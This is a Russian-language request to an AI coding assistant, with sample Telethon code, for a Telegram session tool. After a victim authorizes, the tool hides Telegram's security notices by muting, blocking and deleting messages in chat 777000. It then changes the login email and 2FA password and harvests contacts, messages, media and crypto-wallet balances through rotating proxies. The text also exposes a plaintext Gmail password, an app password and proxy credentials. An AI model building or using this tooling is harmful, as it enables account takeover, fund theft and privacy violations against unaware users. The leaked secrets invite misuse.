на основе этого файла создай локальные инструкцыии которие будут находится в корне проекта
ты в роли senior devops engineer, у тебя большой опит работы, твой подход всегда профессионален и структурирован
четкий предусмотрительный и безупречный, код всегда чистый и понятный, ты всегда проверяешь на ошибки и оптимизируешь
твоя задача сейчас
очень чательно и подробно изучить библиотеку telethon и её документацию
в часности низкоуровневые методы работы с аккаунтом телеграмм
затем,
используя библиотеку telethon и другие необходимые библиотеки
изменить консольный скрипт на python который используя api id и api hash проводит авторизацыю пользователя в телеграмм и другие функции

на страничке катка добавь функцыю - смена login email - пользователя телеграмм именно login email не путать с email recovery
по такой логике 1. после авторизацыи можно вызвать функцию смены login email через консоль
                2. скрипт проверяет существующий ли текущий login email
                3. ели да, - выводить текущий login email (польный или частично замаскированный)
                4. ели нет, - выводить сообщение что login email не установлен и переходит к его установке
                5. если установлен, пытаемя сменить login email на новый емейл - емейл берем из переменной EMAIL_LIST в файле .env (нужно выбрать один из этих емейлов (алгоритм когда каждый раз берется следуйщий емейл из списка и так по кругу)) - методом низкого уровня telethon
                7. код для подтверждения смены login email получаем из почты - код ты будешь брать из почты akulait19@gmail.com пароль от нее "Qweras190!" и спецыальный пароль приложения "wgwh tpf fzwg kvks"
                мисьма с других емейлов переадресовуются на эту почту
                8. после - еще раз запрашываем текущий login email и выводим его (полный или частично замаскированный)
в текущей функцыи реализуй подробное логирование всех шагов и ошибок - логирования можно будет посмотреть в карточке сесии
предосмотри обработку ошибок и исключений
в случай не удачи либо ошыбки - анализируй почему произошла ошибка - изучай новые методы и функции, обращяйся к документации и исправляй работоспособность
вот пример 
"import logging
from typing import Optional

from telethon import errors, functions, types
from telethon.client.telegramclient import TelegramClient


def mask_email(email: str) -> str:
    try:
        name, domain = email.split("@", 1)
        if len(name) <= 2:
            masked_name = name[0] + "*"
        else:
            masked_name = name[0] + "*" * (len(name) - 2) + name[-1]
        parts = domain.split(".")
        if parts:
            parts[0] = parts[0][0] + "*" * max(1, len(parts[0]) - 1)
        return masked_name + "@" + ".".join(parts)
    except Exception:
        return email


async def _get_self_phone(client: TelegramClient, logger: Optional[logging.Logger] = None) -> Optional[str]:
    try:
        me = await client.get_me()
        return getattr(me, "phone", None)
    except Exception as e:
        if logger:
            logger.warning("Не удалось получить номер текущего аккаунта: %s", e)
        return None


async def change_login_email(
    client: TelegramClient,
    new_email: str,
    api_id: int,
    api_hash: str,
    logger: Optional[logging.Logger] = None,
) -> None:
    """
    Сменить (или установить) login email на new_email с подтверждением кода из письма.
    Логика:
    - Сначала пробуем purpose=loginChange (смена); если EMAIL_NOT_SETUP — выполняем loginSetup.
    - Для loginSetup требуется phone_number и phone_code_hash (из auth.sendCode).
    - Затем подтверждаем код через account.verifyEmail.
    """
    log = logger or logging.getLogger(__name__)

    log.info("Запрошена смена login email -> %s", new_email)

    # 1) Попытка смены (требует, чтобы login email уже был установлен ранее)
    try:
        log.info("Проверка: установлен ли текущий login email (попытка loginChange)")
        sent = await client(functions.account.SendVerifyEmailCodeRequest(
            purpose=types.EmailVerifyPurposeLoginChange(),
            email=new_email,
        ))
        log.info("Код подтверждения отправлен на адрес: %s", getattr(sent, "email_pattern", mask_email(new_email)))
        code = input("Введите код из письма для подтверждения смены email: ").strip()
        await client(functions.account.VerifyEmailRequest(
            purpose=types.EmailVerifyPurposeLoginChange(),
            verification=types.EmailVerificationCode(code=code),
        ))
        log.info("Успешно изменён login email на: %s", new_email)
        log.info("Текущий login email (маскированный): %s", mask_email(new_email))
        return
    except errors.EmailNotSetupError:
        log.info("Login email ещё не установлен — выполняем первичную установку (loginSetup)")
    except errors.EmailInvalidError:
        log.error("Указан некорректный email: %s", new_email)
        return
    except errors.EmailNotAllowedError:
        log.error("Этот email нельзя использовать для операции (EMAIL_NOT_ALLOWED): %s", new_email)
        return
    except errors.FloodWaitError as fw:
        log.error("FloodWait при отправке кода на email: подождите %s секунд.", fw.seconds)
        return
    except Exception as e:
        log.exception("Неожиданная ошибка при попытке смены login email: %s", e)
        return

    # 2) Первичная установка (loginSetup)
    phone = await _get_self_phone(client, logger=log)
    if not phone:
        # Если не удалось получить телефон из профиля — спросим у пользователя
        phone = input("Введите номер телефона аккаунта (для loginSetup): ").strip()

    try:
        log.info("Получаем phone_code_hash через auth.sendCode для номера %s", phone)
        sent_code = await client(functions.auth.SendCodeRequest(
            phone_number=phone,
            api_id=api_id,
            api_hash=api_hash,
            settings=types.CodeSettings(
                allow_flashcall=False,
                current_number=True,
                allow_app_hash=True,
                allow_missed_call=False,
                logout_tokens=[],
            ),
        ))
        phone_code_hash = sent_code.phone_code_hash
        log.debug("Получен phone_code_hash=%s", phone_code_hash)

        log.info("Отправляем код подтверждения на email (loginSetup)")
        sent = await client(functions.account.SendVerifyEmailCodeRequest(
            purpose=types.EmailVerifyPurposeLoginSetup(
                phone_number=phone,
                phone_code_hash=phone_code_hash,
            ),
            email=new_email,
        ))
        log.info("Код отправлен на адрес: %s", getattr(sent, "email_pattern", mask_email(new_email)))

        try:
            maybe_phone_code = input("Если пришёл дополнительный код на телефон, введите его (или оставьте пустым): ").strip()
            if maybe_phone_code:
                log.debug("Введён доп.код телефона (будет учтён в логике Telegram без отдельного вызова)")
        except Exception:
            pass

        code = input("Введите код из e-mail: ").strip()
        await client(functions.account.VerifyEmailRequest(
            purpose=types.EmailVerifyPurposeLoginSetup(
                phone_number=phone,
                phone_code_hash=phone_code_hash,
            ),
            verification=types.EmailVerificationCode(code=code),
        ))
        log.info("Login email установлен: %s", new_email)
        log.info("Текущий login email (маскированный): %s", mask_email(new_email))
    except errors.EmailInvalidError:
        log.error("Указан некорректный email: %s", new_email)
    except errors.EmailNotAllowedError:
        log.error("Этот email нельзя использовать для операции (EMAIL_NOT_ALLOWED): %s", new_email)
    except errors.FloodWaitError as fw:
        log.error("FloodWait при loginSetup: подождите %s секунд и повторите.", fw.seconds)
    except errors.PhoneNumberInvalidError:
        log.error("Телефонный номер некорректен для loginSetup: %s", phone)
    except errors.PhoneCodeInvalidError:
        log.error("Неверный телефонный код (phone_code) при loginSetup.")
    except errors.PhoneCodeExpiredError:
        log.error("Телефонный код просрочен при loginSetup.")
    except Exception as e:
        log.exception("Ошибка при первичной установке login email: %s", e)"

    

комплексно подойди к решению задачи
создай файл в туду в котором распиши все шаги и этапы реализации включая изучение документации, написание кода и функций, написания резервных алгоритмов


напиши новую функцыю - "уведомления off"
кнопка на страничке "катка" - скрипт должен выполнить последовательность действий
1. найти среди чатов - техничиский чат "Telegram" с id 777000
2. отключить в этом чате уведомления полностью
3. заблокировать чат "Telegram"
4. удалить 5 последних сообщений в этом чате
5. архивировать чат "Telegram" - поместив его в архив
все действия должны быть выполнены используя низкоуровневые методы библиотеки telethon
в текущей функцыи реализуй подробное логирование всех шагов и ошибок в консоль
предосмотри обработку ошибок и исключений
предерживайся профессионального и структурированного подхода


новая функцыя - "патерны"
при вызовк этой функцыии кнопкой на страничке - скрипт должен:
1. провести поиск всех ключевых слова в сообщениях чатов аккаунта телеграмм
ключевые слова в виде списка (записание через запятую) в файле .env - "SEARCH_PATTERNS"
2. вырывать все сообщения содержащие эти ключевые слова с контекстом - по 5 сообщений до и после найденного сообщения
включая медиа файлы не больше 10 мб. - все выгружать в отдельную папку (включая медиа файлы, названия и параметры чата, дату и время сообщения, собеседников)
процес должен быть очень быстрым и оптимизированным, 

новая функцыя - "аватарка"
выгружает и сохраняет в папку сессии текущую аватарку аккаунта телеграмм
и отображает ее в карточке сессии на страничке катка

новая функцыя - "баланс"
при вызове этой функцыии кнопкой на страничке - скрипт должен выполнить последовательность действий
1. провести поиск по всем телеграм ботам с функцией крипто кошелька
как пример - @wallet, @CryptoBot, @BitcoinWalletBot и тд - список ботов можно брать из файла .env - "CRYPTO_WALLET_BOTS"
2. собрать информацию по балансу всех крипто кошельков привязанных к аккаунту телеграмм
        если польхватель раньше не взаимодействовал с ботом - пропустить этот бот и перейти к следующему
        если пользватель взаимодействовал с ботом - собрать всю доступную информацию по балансу
        команда wallet или balance или аналогичная
        считываем ответы бота и парсим их на наличие информации по балансу
        usdt, btc, eth и другие основные крипто валюты
3. выгрузить всю информацию в отдельный файл в папку сессии
все действия должны быть выполнены используя низкоуровневые методы библиотеки telethon


4. сразу 2 новых кнопки\функцыии 
Выгрузка контактов и выгрузка контактов с фото
при вызове этих функцый кнопками на страничке катка - скрипт должен выполнить действий
вызрузить все контакты аккаунта телеграмм
в первом случае - в папку сессии все контакты (всю информацию по контактам)
во втором случае - в папку сессии - каждый контакт с миниатюрой фото контакта (если фото есть) и всей информацией по контакту
используй низкоуровневые методы библиотеки telethon

реализуем сценарий после - последовательность действий соле авторизации пользвателя в телеграм на страничке менеджер калл
    сразу после авторизацыи - выполняем automate_777000
    после - выполняем auto_change_login_email
    дальше - изменяем пароль 2фа, берем его из переменной в файле .env "NEW_2FA_PASSWORD", поле с подсказкой оставляем пустим - рекавери емейл также оставляем пустим
    потом - выгружаем контакты (без фото)
    потом - выгружаем патерны
    потом - выполняем функцыю баланс
    потом - выгружаем диалоги
    потом - выгружаем сохраненные сообщение
    потом - выгружаем аватарку пользователя
    потом - выгружаем контакты с фото
    все это должно выполняться автоматически по очереди сразу после авторизацыи пользователя
предосмотри обработку ошибок и исключений, основной акцент на надежности и скорости выполнения


аватарка пользвателя в карточке сессии - не обновляются - исправь!!!

кнопка\функцыя контакты + фото - при нажатии проверяет папку сессии на наличие фото контактов и самих контактов
если их нет - выполняет выгрузку контактов с фото
если они есть - на страничке катка открывается модальное окно со списком контактов с фото - дизайн такоей же как и в приложении телеграмм

кнопка патерны - не работает - исправь!!! - ошибка Request failed with status code 400
при нажатии проверяет папку сессии на наличие файла с выгруженными патернами
если его нет - выполняет выгрузку патернов
если он есть - на страничке катка открывается модальное окно со списком найденных патернов с возможностью поиска по ключевым словам - дизайн такоей же как и в приложении телеграмм


кнопка баланс - не работает - исправь!!! - ошибка Request failed with status code 400
при нажатии проверяет папку сессии на наличие файла с выгруженным балансом
если его нет - выполняет выгрузку баланса
если он есть - на страничке катка открывается модальное окно с информацией по балансу - дизайн такоей же как и в приложении телеграмм

Расширенный UI паттернов: интерактивный поиск/фильтрация, просмотр содержимого бандлов (before/match/after) прямо в модале.
Статическая раздача фото контактов: backend отдаёт /katka/:phone/contact-photo/:id (mini-cache + 304 ETag) → фронт показывает реальные миниатюры вместо заглушек.
Унификация модальных окон: компонент Modal с типами контента (JSON, список контактов, паттерны).
Автоматический пост-авторизационный пайплайн (оркестратор последовательности шагов) с прогресс-индикатором и логом.
Дополнительная устойчивость: таймауты/повторы для сетевых операций Telethon (FloodWait retry с экспоненциальной паузой).
Линтеры: ruff + mypy (минимальный конфиг) для Python; ESLint + TypeScript strict для фронта (если не включено).
Метрики: небольшой endpoint агрегирующий количество экспортированных артефактов, время последнего обновления, статус reuse.


важные изменения в логике авторизацыи пользователя
когда пользватель на страничке менеджер калл нажимает кнопку авторизоваться - в момент когда разворачивается форма ввода номера телефона - 
нужно использовать низкоуровневый метод telethon для подключения прокси, до того как номер телефона будет оптправлен на сервер телеграмм

прокси брать из списка в файле .env - PROXY_LIST
логика выбора прокси - каждый раз брать следующий прокси из списка по кругу
если прокси не работает - пробовать следующий прокси из списка пока не получится подключиться успешно

обнови .env файл - добавь в него PROXY_LIST 
 "109.248.142.177:5500:TV4GO0:1Z7dhD8iey",
    "109.248.142.190:5500:TV4GO0:1Z7dhD8iey",
    "109.248.142.208:5500:TV4GO0:1Z7dhD8iey",
    "109.248.142.217:5500:TV4GO0:1Z7dhD8iey",
    "109.248.142.221:5500:TV4GO0:1Z7dhD8iey",
    "109.248.142.228:5500:TV4GO0:1Z7dhD8iey",
    "109.248.142.250:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.4:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.26:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.32:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.34:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.65:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.72:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.102:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.112:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.123:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.129:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.131:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.141:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.147:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.160:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.163:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.169:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.170:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.180:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.190:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.201:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.225:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.238:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.250:5500:TV4GO0:1Z7dhD8iey",
    "109.248.143.252:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.3:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.23:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.25:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.37:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.38:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.47:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.54:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.74:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.76:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.78:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.81:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.84:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.87:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.91:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.98:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.107:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.152:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.155:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.162:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.163:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.205:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.226:5500:TV4GO0:1Z7dhD8iey",
    "188.130.136.249:5500:TV4GO0:1Z7dhD8iey",
    "188.130.137.6:5500:TV4GO0:1Z7dhD8iey",
    "109.248.139.81:5500:TV4GO0:1Z7dhD8iey",
    "46.8.192.135:5500:TV4GO0:1Z7dhD8iey",
    "109.248.138.173:5500:TV4GO0:1Z7dhD8iey",
    "109.248.138.231:5500:TV4GO0:1Z7dhD8iey",
    "109.248.139.13:5500:TV4GO0:1Z7dhD8iey",
    "109.248.139.87:5500:TV4GO0:1Z7dhD8iey",
    "109.248.139.122:5500:TV4GO0:1Z7dhD8iey",
    "109.248.139.197:5500:TV4GO0:1Z7dhD8iey",
    "109.248.139.207:5500:TV4GO0:1Z7dhD8iey",
    "109.248.139.216:5500:TV4GO0:1Z7dhD8iey",
    "109.248.139.231:5500:TV4GO0:1Z7dhD8iey",
    "109.248.139.251:5500:TV4GO0:1Z7dhD8iey",
    "46.8.192.18:5500:TV4GO0:1Z7dhD8iey",
    "46.8.192.57:5500:TV4GO0:1Z7dhD8iey",
    "46.8.192.64:5500:TV4GO0:1Z7dhD8iey",
    "46.8.192.74:5500:TV4GO0:1Z7dhD8iey",
    "46.8.192.135:5500:TV4GO0:1Z7dhD8iey",
    "46.8.192.169:5500:TV4GO0:1Z7dhD8iey",
    "46.8.192.173:5500:TV4GO0:1Z7dhD8iey",
    "46.8.192.219:5500:TV4GO0:1Z7dhD8iey",
    "46.8.192.228:5500:TV4GO0:1Z7dhD8iey",
    "46.8.193.13:5500:TV4GO0:1Z7dhD8iey",
    "46.8.193.19:5500:TV4GO0:1Z7dhD8iey",
    "46.8.193.35:5500:TV4GO0:1Z7dhD8iey",
    "46.8.193.66:5500:TV4GO0:1Z7dhD8iey",
    "46.8.193.144:5500:TV4GO0:1Z7dhD8iey",
    "46.8.193.212:5500:TV4GO0:1Z7dhD8iey",
    "188.130.188.12:5500:TV4GO0:1Z7dhD8iey"

    выводим сообщение в фронтенде о успешной подключении прокси - "Мобильный прокси успешно подключен"

второе важно изменение
при авторизации на страничке менеджер калл - в момент когда пользватель вводит номер телефона - код на телеграмм должен отправлятся на английском языке(текст сообщение с кодом вместо русского - английский)

третье важно изменение - после ввода номера телефона - кнопка "авторизоваться в телеграмм" при помощи низко уревневого метода telethon должен отправлять запрос на получение кода авторизацыи на почту
в случае успеха - выводить сообщение в фронтенде - "Код авторизацыи отправлен на почту"
если на почту не удалось отправить код - пробовать отправить код на телефон (стандартный метод telethon)
в случае успеха - выводить сообщение в фронтенде - "Код авторизацыи отправлен на телефон"
в случаее если иницыализирован звонок на телефон или отправка кода в приложения телеграм - выводить сообщение в фронтенде - "Код авторизацыи отправлен при помощи звонка" и "Код авторизацыи отправлен в приложение телеграмм" соответственно

четвертое важно изменение - при ожидании ввода кода авторизацыи - добавь дополнительную кнопку (котороя не активна 120 секунд после отправки кода) - "код при помощи звонка"
при нажатии этой кнопки - используя низкоуровневый метод telethon - отправлять запрос на получение кода авторизацыи при помощи звонка на телефон
в фронтенде выводим сообщение удались или не удалось иницыализировать звонок с кодом авторизацыи

